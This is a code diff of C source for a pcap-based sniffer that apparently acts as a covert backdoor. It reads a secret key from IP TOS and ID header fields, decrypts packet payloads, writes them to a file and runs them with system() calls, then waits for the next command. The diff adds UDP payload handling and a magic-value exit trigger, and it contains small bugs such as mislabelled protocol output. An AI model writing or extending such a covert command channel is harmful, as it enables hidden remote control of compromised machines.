@@ -69,13 +69,14 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     } else if(length < len){
         perror("Truncated IP");
         exit(1);
-    } /*else if(ip->ip_p == IPPROTO_TCP){
+    } else if(ip->ip_p == IPPROTO_TCP){
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
         if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             printf("Reading payload\n");
             ParseTCP(Filter, pkthdr, packet);
+            ParseUDP(Filter, pkthdr, packet);
         } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
             //change to port knocking
             //ParsePattern(args,pkthdr, packet);
@@ -83,10 +84,16 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         } else {
             printf("Packet tossed wrong key\n");
         }
-    } */else if(ip->ip_p == IPPROTO_UDP){
+    } else if(ip->ip_p == IPPROTO_UDP){
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
+        printf("TTL: %u\n", ip->ip_ttl);
+        if(ip->ip_id == 'x' && ip->ip_tos == 'x'){
+            printf("EXIT LOOP");
+            pcap_breakloop(interfaceinfo);
+        }
+        ParseUDP(Filter, pkthdr, packet);
 
     }
 
@@ -107,6 +114,34 @@ bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
         } else {
             return false;
         }
+    }
+}
+
+void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+    const struct sniff_tcp *udp=0;
+    const struct my_ip *ip;
+    const char *payload;
+
+    int size_ip;
+    int size_udp = 8;
+    int size_payload;
+
+    printf("UDP Packet\n");
+
+    ip = (struct my_ip*)(packet + 14);
+    size_ip = IP_HL(ip)*4;
+
+    udp = (struct sniff_udp*)(packet + 14 + size_ip);
+
+    printf("Source port: %d\n", ntohs(udp->th_sport));
+    printf("Destination port: %d\n", ntohs(udp->th_dport));
+    payload = (u_char *)(packet + 14 + size_ip + size_udp);
+
+    size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
+
+    if(size_payload > 0){
+        printf("Payload (%d bytes):\n", size_payload);
+        ParsePayload(Filter, payload, size_payload, false);
     }
 }
 
@@ -139,7 +174,7 @@ void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
 
     if(size_payload > 0){
         printf("Payload (%d bytes):\n", size_payload);
-        ParsePayload(Filter, payload, size_payload);
+        ParsePayload(Filter, payload, size_payload, true);
     }
 }
 
@@ -167,7 +202,7 @@ void iptables(char *ip, char *protocol, char *port, bool input, bool remove){
 }
 
 
-void ParsePayload(struct filter *Filter, const u_char *payload, int len){
+void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp){
     FILE *fp;
     unsigned char decryptedtext[BUFSIZE+16];
     int decryptedlen, cipherlen;
@@ -185,6 +220,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
         perror("fwrite");
         exit(1);
     }
+    if(tcp){
     fclose(fp);
     system(CHMOD);
     system(CMD);
@@ -199,6 +235,9 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
     printf("\n");
     printf("\n");
     printf("Waiting for new command\n");
+    } else {
+    printf("parsing udp packet\n");
+    }
 }
 
 
